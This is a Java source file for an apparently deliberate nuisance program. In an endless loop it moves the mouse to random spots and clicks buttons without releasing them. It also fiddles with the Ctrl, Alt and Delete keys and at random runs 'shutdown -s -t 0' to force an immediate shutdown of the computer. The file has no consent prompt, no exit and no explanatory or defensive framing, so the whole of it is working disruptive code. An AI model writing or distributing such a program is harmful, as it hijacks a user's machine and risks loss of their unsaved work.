package com.github.mechanictc2.shit.jar;

import java.awt.AWTException;
import java.awt.Dimension;
import java.awt.Robot;
import java.awt.Toolkit;
import java.io.IOException;
import java.util.Random;

class Main {
	private static Random rand;
	private static int xCoord;
	private static int yCoord;
	private static Robot robot;
	private static Dimension screenSize;
	private static Runtime runtime;
	
	@SuppressWarnings("deprecation")
	public static void main(String[] args) {
		rand = new Random();
		screenSize = Toolkit.getDefaultToolkit().getScreenSize();
	    while (true) {
	    	try {
	    		xCoord = (int) rand.nextDouble(screenSize.getWidth());
		        yCoord = (int) rand.nextDouble(screenSize.getHeight());
		        robot = new Robot();
		        robot.mouseMove(xCoord, yCoord);
  		        switch (rand.nextInt(100)) {
  		        	case 0:
  				        robot.mousePress(1024); //BUTTON1
  				        break;
  		        	case 1:
  				        robot.mousePress(2048); //BUTTON2
  				        break;
  		        	case 2:
  				        robot.mousePress(4096); //BUTTON3
  				        break;
  		        	case 3:
  				        robot.keyRelease(17);  //VK_CONTROL
  				        robot.keyRelease(18);  //VK_ALT
  				        robot.keyRelease(127); //VK_DELETE
  				        break;
  		        	case 4:
  		        		runtime = Runtime.getRuntime();
  						try {
  							runtime.exec("shutdown -s -t 0"); //SHUTDOWN COMPUTER
  						}
  						catch (IOException e) {
  				    		System.out.println("fatal error!");
  							e.printStackTrace();
  							continue;
  						}
  						break;
  		        }
	    	}
	    	catch (AWTException e) {
	    		System.out.println("fatal error!");
	    		e.printStackTrace();
	    		continue;
	    	}
	    } 
	}
}